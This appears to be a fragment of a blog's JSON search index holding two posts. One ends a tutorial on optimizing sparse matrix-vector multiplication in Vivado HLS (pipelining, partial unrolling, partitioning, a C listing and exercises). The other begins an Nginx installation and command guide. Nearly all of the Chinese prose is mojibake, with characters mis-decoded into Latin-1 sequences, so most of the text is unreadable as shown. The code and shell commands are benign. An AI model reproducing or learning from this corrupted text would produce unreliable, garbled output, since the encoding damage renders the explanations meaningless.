å¿«ã€‚å¦‚æœä¸é‡‡ç”¨æµæ°´ï¼ŒL2 å¾ªç¯å°†æŒ‰ç…§ä¸²è¡Œæ‰§è¡Œã€‚æ³¨æ„ï¼ŒL1 å¾ªç¯æ­¤æ—¶è¿˜æ˜¯æŒ‰ç…§ä¸²è¡Œçš„æ–¹å¼æ‰§è¡Œã€‚\nå›¾6.5æ¼”ç¤ºäº†spmvå‡½æ•°åœ¨L2å¾ªç¯é‡‡ç”¨æµæ°´æ–¹å¼æ—¶è¿è¡Œçš„æ­¥éª¤ã€‚æ¯æ¬¡L2çš„å¾ªç¯éƒ½è¢«II=3I**I=3æµæ°´åŒ–ã€‚æµæ°´çº¿å…è®¸åœ¨å¤–å±‚å¾ªç¯æ‰§è¡Œä¸€æ¬¡è¿­ä»£æ—¶ï¼Œå†…å±‚å¾ªç¯æ‰§è¡Œå¤šæ¬¡å¾ªç¯è¿­ä»£ã€‚æ­¤æ—¶ï¼Œå†…å±‚å¾ªç¯IIå—é™äºé€’å½’ï¼ˆrecurrence ï¼‰æ“ä½œã€‚II=3I**I=3æ˜¯å› ä¸ºæˆ‘ä»¬è®¤ä¸ºåŠ æ³•å™¨æœ‰3ä¸ªæ—¶é’Ÿå‘¨æœŸçš„å»¶è¿Ÿã€‚å¤–éƒ¨å¾ªç¯æ²¡æœ‰é‡‡ç”¨æµæ°´çš„æ–¹å¼ï¼Œæ‰€ä»¥å†…å±‚çš„å¾ªç¯å¿…é¡»åœ¨ä¸‹å¤–å±‚L2å¾ªç¯å¼€å§‹æ‰§è¡Œå‰ï¼Œè®¡ç®—å®Œæˆå¹¶è¾“å‡ºç»“æœã€‚\nå¯¹æœ€å†…å±‚çš„L2 for å¾ªç¯è¿›è¡Œæµæ°´åŒ–ï¼Œé€šè¿‡åœ¨spmvå‡½æ•°ä¸­å¢åŠ æµæ°´directiveå¦‚å›¾6.2æ‰€ç¤ºã€‚II(initiation interval)æœ€åæ˜¯å¤šå°‘ï¼Ÿåœ¨ä½ æŒ‡å®šIIçš„å€¼ä»¥åï¼Œæœ€ç»ˆç›®æ ‡çš„IIå€¼æ˜¯å¢å¤§äº†è¿˜æ˜¯å‡å°‘äº†ï¼Ÿ\nè§‚å¯Ÿæ‰§è¡Œæ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªå› ç´ é™åˆ¶äº†å¾ªç¯æ‰§è¡Œæ€§èƒ½ã€‚ç¬¬ä¸€ä¸ªå› ç´ ï¼Œé€’å½’ï¼ˆrecurrence ï¼‰æ“ä½œé™åˆ¶äº†å¾ªç¯çš„ IIã€‚ç¬¬äºŒä¸ªå› ç´ ï¼Œå¤–å±‚çš„å¾ªç¯æ²¡æœ‰é‡‡ç”¨æµæ°´çš„æ–¹å¼ã€‚ä¸€ç§é«˜æ•ˆè®¡ç®—ç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•çš„æ–¹å¼ï¼Œæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸæŠŠä¹˜æ³•å™¨å’ŒåŠ æ³•å™¨ä½¿ç”¨èµ·æ¥ã€‚å½“å‰çš„è®¾è®¡ç¦»è¿™ä¸ªç›®æ ‡è¿˜å¾ˆè¿œã€‚\nåœ¨ç« èŠ‚4.3ä¸­ï¼Œæˆ‘ä»¬æ¢ç©¶äº†å‡ ç§è®¾è®¡ä¼˜åŒ–æŠ€æœ¯ï¼Œå…¶ä¸­åŒ…æ‹¬å¯¹ä¸åŒçš„å¾ªç¯è¿›è¡Œæµæ°´ï¼Œå¾ªç¯å±•å¼€ï¼Œæ•°ç»„åˆ†å‰²ã€‚æŒæ¡åœ¨è¿™äº›æŠ€æœ¯ä¹‹é—´è¿›è¡Œæƒè¡¡æ˜¯ä¸€é¡¹æŒ‘æˆ˜ï¼Œå› ä¸ºå®ƒä»¬ä¹‹é—´ç»å¸¸ç›¸äº’ä¾èµ–ã€‚æˆ‘ä»¬é€šå¸¸è”åˆä½¿ç”¨è¿™äº›æŠ€æœ¯ï¼Œä¸ºäº†å¾—åˆ°å¥½çš„æ€§èƒ½è°¨æ…çš„é€‰æ‹©å…¶ä¸­ä¸€ç§è€Œä¸é€‰æ‹©å¦ä¸€ç§ä¹Ÿè®¸ç»“æœä¼šæ›´ç³Ÿç³•ã€‚ä¾‹å¦‚ï¼Œåœ¨æˆ‘ä»¬ä½¿ç”¨å¾ªç¯å±•å¼€æ˜¯ï¼Œè®¾è®¡è€…éœ€è¦æ˜ç™½å®ƒå¯¹æ•°æ®è®¿é—®çš„å½±å“ã€‚å¢åŠ äº†å¯¹æ•°æ®è®¿é—®çš„æ“ä½œä½†æ˜¯è®¾è®¡æ€§èƒ½åˆå—é™äºæ•°æ®è®¿é—®æ—¶ï¼Œä¼˜åŒ–æ¯«æ— ç›Šå¤„ã€‚åŒæ ·ï¼Œå¦‚æœæä¾›äº†å†—ä½™çš„å­˜å‚¨ç«¯å£ï¼Œå®é™…ä¸­ä½¿ç”¨ç‡ä¸é«˜ï¼Œè¿™æ ·å¯¹æé«˜æ€§èƒ½æ¯«æ— å¸®åŠ©åè€Œå¢åŠ äº†èµ„æºçš„æ¶ˆè€—ã€‚\nä»”ç»†æ€è€ƒä¸€ä¸‹ä¸Šè¿°ä¼˜åŒ–æŠ€æœ¯ç»„åˆåå¤æ‚å¤šå˜çš„æ ·å¼ï¼Œæˆ‘ä»¬å»ºè®®ä½ å°è¯•ä¸‹é¢çš„ç»ƒä¹ ï¼š\nå¯¹spmvè®¾è®¡è¿›è¡Œç»¼åˆï¼Œé‡‡ç”¨è¡¨6.1æä¾›çš„10ç§directivesï¼Œæ¯ç§éƒ½æœ‰ä¸åŒçš„æµæ°´ï¼Œå±•å¼€å’Œåˆ†å‰²é’ˆå¯¹ä¸åŒçš„å¾ªç¯å’Œæ•°ç»„ã€‚è¿™äº›åˆ†å‰²åœ¨ä¸åŒçš„æ•°ç»„ï¼ˆvaluesã€columnIndexã€xï¼‰ä¸Šä½¿ç”¨ã€‚ä½ çœ‹åˆ°ç»“æœçš„è¶‹åŠ¿æ˜¯å¦‚ä½•çš„ï¼Ÿå¢åŠ äº†å±•å¼€å’Œåˆ†å‰²ï¼Œæ˜¯æœ‰åˆ©äºè¿˜æ˜¯ä¸åˆ©äºé¢ç§¯ï¼Ÿæ€§èƒ½å¦‚ä½•ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ\nè¡¨6.1 ç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•å¯ä¼˜åŒ–çš„æ–¹å¼\n    L1 L2     case1 - -   case2 - pipeline   case3 pipeline -   case4 unroll=2 -   case5 - pipeline,unroll=2   case6 - pipeline,unroll=2,cyclic=2   case7 - pipeline,unroll=4   case8 - pipeline,unroll=4,cyclic=4   case9 - pipeline,unroll=8   case10 - pipeline,unroll=8,cyclic=8   case11 - pipeline,unroll=8,block=8    å¦‚æœä½ å®Œæˆäº†ä¸Šè¿°ç»ƒä¹ ï¼Œä½ ä¼šå‘ç°ç›²ç›®çš„ä½¿ç”¨ä¼˜åŒ–directivesï¼Œå¯èƒ½ä¸ä¼šå¾—åˆ°ä½ æœŸæœ›çš„ç»“æœã€‚é€šå¸¸åœ¨è®¾è®¡æ—¶ï¼Œ åœ¨æ€è€ƒä¸‹è€ƒè™‘åº”ç”¨çš„ç‰¹æ€§ï¼Œé€‰æ‹©é’ˆå¯¹è®¾è®¡çš„ç‰¹å®šä¼˜åŒ–æ–¹å¼ã€‚å½“ç„¶ï¼Œè¿™ä¹Ÿéœ€è¦ä¸€äº›ç›´è§‰èƒ½åŠ›å’Œä¸€äº›ä¸“ç”¨å·¥å…·æŠ•å…¥ä½¿ç”¨ã€‚è™½ç„¶ï¼Œææ¸…æ¥šåƒVivadoÂ®HLSè¿™æ ·å¤æ‚å·¥å…·ä¸­æ¯ä¸€ä¸ªç»†èŠ‚æ˜¯å›°éš¾ä¹ƒè‡³ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½åŸºäºå…³é”®çš„æ–¹é¢å»ºç«‹æ€è€ƒæ¨¡å‹ã€‚\nä¸Šé¢æˆ‘ä»¬åœ¨ç”¨ä¾‹3å’Œ4ä¸­è€ƒè™‘å¯¹å¤–å±‚å¾ªç¯L1è¿›è¡Œæµæ°´åŒ–æ“ä½œè€Œä¸æ˜¯å¯¹å†…å±‚å¾ªç¯ã€‚è¿™ç§å˜åŒ–é’ˆå¯¹ä¸€ä¸ªä»»åŠ¡ï¼Œå¯ä»¥æé«˜æ½œåœ¨çš„å¹¶è¡Œç¨‹åº¦ã€‚ä¸ºäº†å®Œæˆä¼˜åŒ–ï¼ŒVivadoÂ®HLS å·¥å…·å¿…é¡»å±•å¼€ä»£ç ä¸­æ‰€æœ‰çš„å†…å±‚å¾ªç¯L2 ã€‚å¦‚æœå¾ªç¯èƒ½å…¨éƒ¨å±•å¼€ï¼Œè¿™æ ·èƒ½å‡å°‘è®¡ç®—å¾ªç¯è¾¹ç•Œçš„æ—¶é—´ï¼ŒåŒæ—¶ä¹Ÿèƒ½æ¶ˆé™¤é€’å½’ï¼ˆrecurrencesï¼‰ã€‚ä½†æ˜¯ä»£ç ä¸­çš„å†…å±‚å¾ªç¯Vivado HLSæ˜¯æ— æ³•å®Œå…¨å±•å¼€çš„ï¼Œå› ä¸ºå¾ªç¯è¾¹ç•Œä¸æ˜¯å¸¸é‡ã€‚\nä¾‹å¦‚åœ¨å®ç°ä¸Šé¢æåˆ°çš„ä¾‹å­3ï¼Œåœ¨æœ€å¤–å±‚çš„å¾ªç¯L1ä½¿ç”¨æµæ°´åŒ–directiveã€‚åœ¨ä¸è®¾å®šç›®æ ‡IIæ—¶ï¼ŒIIå€¼æ˜¯å¤šå°‘ï¼Ÿèµ„æºå ç”¨ç‡å‘ç”Ÿäº†ä»€ä¹ˆå˜åŒ–ï¼Ÿå¢åŠ äº†IIåèµ„æºå ç”¨ç‡ç»“æœå¦‚ä½•ï¼Ÿè¿™ä¸ä¹‹å‰é‡‡å¯¹L2å¾ªç¯è¿›è¡Œæµæ°´åŒ–ï¼Œç»“æœæœ‰ä»€ä¹ˆä¸åŒï¼Ÿè¿™å’Œæœ€åŸºæœ¬çš„è®¾è®¡ï¼ˆæ—  directivesï¼‰ç›¸æ¯”æœ‰ä»€ä¹ˆä¸åŒï¼Ÿå½“ä½ å¯¹å¤–å±‚å¾ªç¯è¿›è¡Œå±•å¼€æ—¶ï¼Œç»“æœåˆ°åº•å¦‚ä½•ï¼Ÿï¼ˆæç¤ºï¼šæ£€æŸ¥ç»¼åˆåçš„æ—¥å¿—ä¿¡æ¯ï¼‰\nå¦å¤–ä¸€ç§å¢åŠ å¹¶è¡ŒåŒ–çš„æ–¹å¼æ˜¯å¯¹å†…å±‚å¾ªç¯è¿›è¡Œå±€éƒ¨å¾ªç¯å±•å¼€ï¼Œå°±åƒä¹‹å‰ä¾‹å­5åˆ°10ã€‚è¿™ç§å˜åŒ–å®ç°æ›´å¤šçš„å¹¶è¡ŒåŒ–ï¼Œé€šè¿‡åœ¨ç›¸åŒçš„å¾ªç¯è¿­ä»£ä¸­ï¼Œæ‰§è¡Œæ›´å¤šçš„æ“ä½œã€‚æœ‰äº›æƒ…å†µï¼ŒVivado HLS å·¥å…·åœ¨å¯¹å†…å±‚å¾ªç¯è¿›è¡Œæµæ°´åŒ–æ—¶ï¼Œé€šè¿‡å®ç°æ›´å¤šæ“ä½œæ¥æé«˜æ€§èƒ½ã€‚ä½†æ˜¯ï¼Œè¿™è¿˜æ˜¯å¾ˆéš¾æé«˜å†…å±‚å¾ªç¯çš„IIï¼Œç”±äºå†…å±‚å¾ªç¯çš„é€’å½’æ“ä½œã€‚ä½†æ˜¯ï¼Œåœ¨IIå¤§äº1çš„æƒ…å†µä¸‹ï¼Œ è®¸å¤šæ“ä½œå¯ä»¥å…±äº«åŒä¸€ä¸ªè®¡ç®—å•å…ƒã€‚\nå›¾6.6å±•ç¤ºäº†ä¸€ä¸ªå±€éƒ¨å±•å¼€çš„ä»£ç ã€‚åœ¨è¿™æ®µä»£ç ä¸­ï¼ŒL2 å¾ªç¯è¢«åˆ†æˆ2ä¸ªå¾ªç¯ï¼Œåˆ†åˆ«ä¸ºL2_1å’ŒL2_2ã€‚æœ€å†…å±‚çš„å¾ªç¯L2_2æ‰§è¡Œçš„æ¬¡æ•°ç”±å‚æ•°Sç¡®å®šã€‚å†…éƒ¨å¾ªç¯åŒ…å«äº†æœ€åŸå§‹çš„L2å¾ªç¯ï¼Œå…¶ä¸­å¾ªç¯è¾¹ç•Œæ˜¯ç”±æœ€åŸå§‹çš„L2å¾ªç¯ç¡®å®šçš„ã€‚ä»£ç ä¸­ï¼ŒL2_1 å¾ªç¯åŒ…å«äº†ä¸ç¡®å®šæ¬¡æ•°çš„ä¹˜æ³•å’ŒåŠ æ³•æ“ä½œï¼Œè¿ç®—æ¬¡æ•°ç”±å‚æ•°Sç¡®å®šï¼Œå’Œä¸€æ¬¡é€’å½’å®Œæˆç´¯åŠ y0 += yty0+=y**tã€‚\næ³¨æ„å›¾6.6ä¸­çš„ä»£ç å’Œè‡ªåŠ¨å¾ªç¯å±•å¼€çš„ä»£ç æ˜¯ç”±ä¸€ç‚¹ç‚¹åŒºåˆ«çš„ã€‚è‡ªåŠ¨å¾ªç¯å±•å¼€å¤åˆ¶è®¡ç®—ï¼Œä½†æ˜¯ä¿ç•™æ¯æ¬¡è®¡ç®—å…ˆåé¡ºåºï¼ˆé™¤äº†å½“å‰çš„ä¾‹å­ï¼‰ã€‚è¿™å°±å¯¼è‡´äº†è®¡ç®—é¡ºåºç”±å†…å±‚å¾ªç¯å†³å®šï¼Œå¦‚å›¾6.7å·¦æ‰€ç¤ºã€‚å¯¹è®¡ç®—é¡ºåºè¿›è¡Œè°ƒæ•´åï¼Œæ“ä½œä¸Šçš„ä¾èµ–å…³ç³»å¦‚å›¾6.7 å·¦è¾¹æ‰€ç¤ºã€‚åœ¨å½“å‰çš„ä»£ç ä¸­ï¼Œæœ€åç´¯åŠ æ±‚å’Œæ˜¯ä¸€ä¸ªé€’å½’ï¼ˆrecurrence ï¼‰ã€‚å½“ä½¿ç”¨æµ®ç‚¹æ•°æ®ç±»å‹æ—¶ï¼Œè¿™ç§è°ƒæ•´è®¡ç®—é¡ºåºçš„æ“ä½œå¯èƒ½å¯¹ç¨‹åºäº§ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥Vivado HLSå¯¹è¿™ç§ç±»å‹çš„ä»£ç ä¸è¿›è¡Œæ“ä½œé¡ºåºè‡ªåŠ¨è°ƒæ•´ã€‚\nè¿™ä¸ªè®¾è®¡å¯èƒ½ä¼šè¢«ç»¼åˆã€å®ç°å¦‚å›¾6.8æ‰€ç¤ºçš„ç»“æœã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒS=3S=3ä¸III**Iæœ€åŒ¹é…ï¼Œä¹˜æ³•å™¨çš„å»¶è¿Ÿæ­£å¥½æ˜¯3ã€‚æ‰€æœ‰çš„è¿ç®—è¿‡ç¨‹éƒ½æ˜¯åœ¨ä¸€ä¸ªä¹˜æ³•å™¨å’ŒåŠ æ³•å™¨ä¸Šæ‰§è¡Œã€‚æ¯”è¾ƒè¿™ä¸ªä¾‹å­ä¸å›¾6.5ä¸­çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€äº›ç¼ºç‚¹ã€‚æœ€æ˜æ˜¾çš„æ˜¯ï¼Œå†…å±‚å¾ªç¯çš„æµæ°´çº¿é•¿åº¦å¾ˆé•¿ï¼Œå®ç°çš„æ—¶å€™éœ€è¦å¤šä¸ªæ›´å¤šçš„å‘¨æœŸåˆ·æ–°æµæ°´çº¿çš„è¾“å‡ºï¼Œæ‰èƒ½æ‰§è¡Œä¸‹ä¸€æ¬¡å¤–å±‚L1å¾ªç¯ã€‚å¤„ç†ä¸€è¡Œä¸­éé›¶å…ƒç´ å’Œæ‰§è¡Œå—S ç›¸åŒã€‚ä¸€è¡Œæœ‰ä¸ª3ä¸ªå…ƒç´ å’Œä¸€è¡Œæœ‰ä¸€ä¸ªå…ƒç´ è®¡ç®—çš„æ—¶é—´æ˜¯ç›¸åŒçš„ã€‚å‰©ä¸‹çš„è¿ç®—ä¹Ÿéœ€è¦åœ¨å¾ªç¯æµæ°´çº¿ä¸­æ‰§è¡Œï¼Œå³ä½¿ä»–ä»¬çš„ç»“æœæ²¡æœ‰ç”¨ã€‚ä¸ºäº†ä¸¥æ ¼çš„æ¯”è¾ƒä¸¤ä¸ªè®¾è®¡çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£è®¾è®¡å¯¹çŸ©é˜µæ¯è¡Œéé›¶å…ƒç´ ä¸ªæ•°çš„é¢„æœŸã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #include \"spmv.h\" const static int S = 7; void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]) { L1: for (int i = 0; i \u003c NUM_ROWS; i++) { DTYPE y0 = 0; L2_1: for (int k = rowPtr[i]; k \u003c rowPtr[i+1]; k += S) { #pragma HLS pipeline II=S  DTYPE yt = values[k] * x[columnIndex[k]]; L2_2: for(int j = 1; j \u003c S; j++) { if(k+j \u003c rowPtr[i+1]) { yt += values[k+j] * x[columnIndex[k+j]]; } } y0 += yt; } y[i] = y0; } }   å›¾6.6 å±€éƒ¨å±•å¼€å›¾6.2ä¸­smpvå‡½æ•°\nå›¾6.7 é’ˆå¯¹ç´¯åŠ çš„ä¸¤ç§ä¸åŒæ–¹å¼çš„å±€éƒ¨å±•å¼€ã€‚å·¦è¾¹çš„ç‰ˆæœ¬æœ‰3ä¸ªåŠ æ³•å™¨è¿›è¡Œé€’å½’æ“ä½œï¼Œç›¸åå³è¾¹çš„ç‰ˆæœ¬åªæœ‰1ä¸ªåŠ æ³•å™¨è¿›è¡Œé€’å½’ç´¯åŠ \nå›¾6.8 å›¾6.6ä¸­ spmvå‡½æ•°åŸºäºéƒ¨åˆ†å±•å¼€å’Œå†…éƒ¨æµæ°´çº¿å¤„ç†åæ‰§è¡Œè¿‡ç¨‹\nå¦‚æœçŸ©é˜µæ¯è¡Œéé›¶å…ƒç´ å¾ˆå°‘ï¼Œåˆ™é‡‡ç”¨ç¬¬ä¸€ç§å®ç°æ–¹å¼è¾ƒä¼˜ï¼›å¦‚æœçŸ©é˜µä¸­æ¯è¡Œéé›¶å…ƒç´ è¾ƒå¤šï¼Œåˆ™ç¬¬äºŒç§å®ç°æ–¹å¼æ›´å¥½ã€‚\néœ€è¦æ³¨æ„ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå…³äºå…ˆæœ‰é¸¡è¿˜æ˜¯å…ˆæœ‰è›‹çš„é—®é¢˜ã€‚æˆ‘ä»¬éœ€è¦çŸ¥é“ç›®æ ‡å™¨ä»¶å’Œæ—¶é’Ÿå‘¨æœŸï¼Œè¿™æ ·æ‰èƒ½ç¡®å®šæµæ°´çº¿ä¸­åŠ æ³•å™¨èƒ½ä¸èƒ½æ»¡è¶³æ—¶åºè¦æ±‚ã€‚åªæœ‰åœ¨æˆ‘ä»¬çŸ¥é“æµæ°´çº¿çš„çº§æ•°ä¹‹åï¼ˆä¹Ÿè®¸S=1æ—¶ï¼ŒVivado HLSæ‰èƒ½è¯†åˆ«åˆ°åŠ æ³•é€’å½’ï¼‰ï¼Œæˆ‘ä»¬æ‰èƒ½é€‰æ‹©åˆé€‚ç‰ˆæœ¬çš„å‚æ•°Sï¼Œæ¥æ»¡è¶³II=1I**I=1ã€‚ä¸€æ—¦æˆ‘ä»¬ç¡®å®šäº†Sï¼Œæˆ‘ä»¬èƒ½é€šè¿‡C/RTLååŒä»¿çœŸæ¥ï¼Œé€šè¿‡ä¸€ç»„æµ‹è¯•æ•°æ®ï¼Œç¡®å®šæ˜¯ä¸æ˜¯è¾¾åˆ°äº†æ€§èƒ½ä¸Šçš„è¦æ±‚ã€‚å› ä¸ºå¾ªç¯è¾¹ç•Œæ˜¯å¯å˜çš„ï¼Œæ‰€ä»¥å¾—åˆ°çš„æ€§èƒ½å‚æ•°æ˜¯ä¾èµ–äºæ•°æ®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®¾å®šä¸åŒçš„Sï¼Œæ¥æ‰¾åˆ°æ€§èƒ½çš„æœ€å¤§å€¼ã€‚æ”¹å˜å™¨ä»¶çš„ç±»å‹å’Œå·¥ä½œé¢‘ç‡ä¼šå½±å“ä¹‹å‰æ‰€æœ‰çš„è®¾è®¡ï¼å°½ç®¡çœ‹æ¥å»é«˜å±‚æ¬¡ç»¼åˆï¼ˆHLSï¼‰å¯¹è§£å†³é—®é¢˜æä¾›çš„å¸®åŠ©ä¸å¤šï¼Œç›¸æ¯”äºRTLå¼€å‘æ–°ç‰ˆæœ¬ç„¶åè¿›è¡ŒéªŒè¯ï¼Œå®ƒå¼€å‘èµ·æ¥å¿«ï¼ˆä»£ç ç¼–å†™æ–¹ä¾¿ï¼‰ã€‚\nå›¾6.8å¯ä»¥å®ç°æ—¶ï¼ŒS ä¸åŠ æ³•å™¨æµæ°´çº¿ç­‰çº§ç›¸åŒã€‚å¦‚æœSè®¾å®šè¾ƒå¤§ï¼Œç»“æœä¼šæ€æ ·ï¼Ÿå¦‚æœS è®¾å®šè¾ƒå°ï¼Œç»“æœä¼šæ€æ ·ï¼Ÿå¦‚æœç›®æ ‡IIå°äºSä¼šæ€æ ·ï¼Ÿå¦‚æœç›®æ ‡IIå¤§äºSä¼šæ€æ ·ï¼Ÿ\n6.7å°ç»“ åœ¨æœ¬ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†ç³»æ•°çŸ©é˜µå‘é‡ä¹˜æ³•ï¼ˆSpMVï¼‰ï¼Œè¿™å»¶ç»­äº†ä¹‹å‰å¯¹çŸ©é˜µè¿ç®—çš„ç ”ç©¶ã€‚SpMV æ˜¾å¾—å¾ˆæœ‰è¶£ï¼Œå› ä¸ºå®ƒé‡‡ç”¨äº†ä¸€ç§ç‰¹åˆ«çš„æ•°æ®ç»“æ„ã€‚ä¸ºäº†å‡å°‘å¤§é‡çš„å­˜å‚¨ï¼ŒçŸ©é˜µé‡‡ç”¨è¡Œå‹ç¼©çš„æ–¹å¼å­˜å‚¨ï¼Œè¿™æ ·å°±è¦æ±‚æˆ‘ä»¬ä»¥ä¸€ç§éç›´æ¥çš„æ–¹å¼å¯¹çŸ©é˜µè¿›è¡Œè®¿é—®ã€‚\nè¿™ä¸€ç« èŠ‚é¦–å…ˆæˆ‘ä»¬äº†VivadoÂ®HLSå·¥å…·æµ‹è¯•å’Œä»¿çœŸçš„èƒ½åŠ›ã€‚æˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªåŸºäºSpMVç®€å•çš„æ¿€åŠ±æ–‡ä»¶ï¼Œè®²è§£HLSå·¥ä½œæµç¨‹ã€‚å¦å¤–ï¼Œæˆ‘ä»¬å¯¹VivadoÂ®HLSå·¥å…·ä¸­C/RTL ååŒä»¿çœŸè¿›è¡Œäº†è®²è§£ã€‚è¿™å¯¹æˆ‘ä»¬å¾—åˆ°è®¾è®¡å‡†ç¡®æ€§èƒ½ç»“æœæ˜¯ååˆ†é‡è¦ã€‚çŸ©é˜µè¶Šä¸ç¨€ç–ï¼Œåˆ™æ›´å¤šçš„è®¡ç®—éœ€è¦æ‰§è¡Œã€‚åœ¨æµ‹è¯•å¹³å°ç¡®å®šä»¥åï¼ŒååŒä»¿çœŸå¯ä»¥æä¾›ç¨‹åºè¿è¡Œçš„ç²¾ç¡®ä»¿çœŸã€‚è¿™æ ·å°±å¯ä»¥è¾¾åˆ°æ‰§è¡Œå‘¨æœŸå’Œæ€§èƒ½ç»“æœã€‚æœ€åï¼Œæˆ‘ä»¬è®¨è®ºäº†é‡‡ç”¨å¾ªç¯ä¼˜åŒ–å’Œæ•°ç»„åˆ†å—å¯¹ä»£ç è¿›è¡Œä¼˜åŒ–ã€‚\n fpgaå¹¶è¡Œç¼–ç¨‹\n ","description":"","tags":["spmv"],"title":"spmv","uri":"/posts/spmv/"},{"categories":["nginx"],"content":"Nginxå®‰è£…åŠé…ç½®  æœ¬æ–‡å‚è€ƒï¼š\nNginxå®‰è£…é…ç½®_èœé¸Ÿæ•™ç¨‹\nNginxä¸­æ–‡æ–‡æ¡£\nNginxç®€æ˜“æ•™ç¨‹\n æ¦‚è¿° ä»€ä¹ˆæ˜¯nginx?\nNginx (engine x) æ˜¯ä¸€æ¬¾è½»é‡çº§çš„Web æœåŠ¡å™¨ ã€åå‘ä»£ç†æœåŠ¡å™¨åŠç”µå­é‚®ä»¶ï¼ˆIMAP/POP3ï¼‰ä»£ç†æœåŠ¡å™¨ã€‚\nä»€ä¹ˆæ˜¯åå‘ä»£ç†ï¼Ÿ\nåå‘ä»£ç†ï¼ˆReverse Proxyï¼‰æ–¹å¼æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å—internetä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ã€‚\nå®‰è£…ä¸ä½¿ç”¨ å®‰è£…\nnginxå®˜ç½‘ä¸‹è½½åœ°å€ï¼šhttp://nginx.orgï¼Œå‘å¸ƒç‰ˆæœ¬åˆ†ä¸º Linux å’Œ windows ç‰ˆæœ¬ã€‚\nä¹Ÿå¯ä»¥ä¸‹è½½æºç ï¼Œç¼–è¯‘åè¿è¡Œã€‚\nä»æºä»£ç ç¼–è¯‘ Nginx\næŠŠæºç è§£å‹ç¼©ä¹‹åï¼Œåœ¨ç»ˆç«¯é‡Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š\n1 2 3  $ ./configure $ make $ sudo make install   é»˜è®¤æƒ…å†µä¸‹ï¼ŒNginx ä¼šè¢«å®‰è£…åœ¨ /usr/local/nginxã€‚é€šè¿‡è®¾å®šç¼–è¯‘é€‰é¡¹ï¼Œä½ å¯ä»¥æ”¹å˜è¿™ä¸ªè®¾å®šã€‚\nWindows å®‰è£…\nä¸ºäº†å®‰è£… Nginx / Win32ï¼Œéœ€å…ˆä¸‹è½½å®ƒ(Nginxå®˜æ–¹ä¸‹è½½)ã€‚ç„¶åè§£å‹ä¹‹ï¼Œç„¶åè¿è¡Œå³å¯ã€‚ä¸‹é¢ä»¥ C ç›˜æ ¹ç›®å½•ä¸ºä¾‹è¯´æ˜ä¸‹ï¼š\n1  nginx-0.8.54 start nginx   Nginx / Win32 æ˜¯è¿è¡Œåœ¨ä¸€ä¸ªæ§åˆ¶å°ç¨‹åºï¼Œè€Œé windows æœåŠ¡æ–¹å¼çš„ã€‚æœåŠ¡å™¨æ–¹å¼ç›®å‰è¿˜æ˜¯å¼€å‘å°è¯•ä¸­ã€‚\nä½¿ç”¨ nginx çš„ä½¿ç”¨æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å‡ æ¡å‘½ä»¤ã€‚\nå¸¸ç”¨åˆ°çš„å‘½ä»¤å¦‚ä¸‹ï¼š\n **nginx -s stop ï¼š**å¿«é€Ÿå…³é—­Nginxï¼Œå¯èƒ½ä¸ä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œå¹¶è¿…é€Ÿç»ˆæ­¢webæœåŠ¡ã€‚ **nginx -s quit ï¼š**å¹³ç¨³å…³é—­Nginxï¼Œä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œæœ‰å®‰æ’çš„ç»“æŸwebæœåŠ¡ã€‚ **nginx -s reload ï¼š**å› æ”¹å˜äº†Nginxç›¸å…³é…ç½®ï¼Œéœ€è¦é‡æ–°åŠ è½½é…ç½®è€Œé‡è½½ã€‚ **nginx -s reopen ï¼š**é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ã€‚ **nginx -c filename ï¼š**ä¸º Nginx æŒ‡å®šä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¥ä»£æ›¿ç¼ºçœçš„ã€‚ **nginx -t ï¼š**ä¸è¿è¡Œï¼Œè€Œä»…ä»…æµ‹è¯•é…ç½®æ–‡ä»¶ã€‚nginx å°†æ£€æŸ¥é…ç½®æ–‡ä»¶çš„è¯­æ³•çš„æ­£ç¡®æ€§ï¼Œå¹¶å°è¯•æ‰“å¼€é…ç½®æ–‡ä»¶ä¸­æ‰€å¼•ç”¨åˆ°çš„æ–‡ä»¶ã€‚ **nginx -vï¼š**æ˜¾ç¤º nginx çš„ç‰ˆæœ¬ã€‚ **nginx -Vï¼š**æ˜¾ç¤º nginx çš„ç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨ç‰ˆæœ¬å’Œé…ç½®å‚æ•°ã€‚  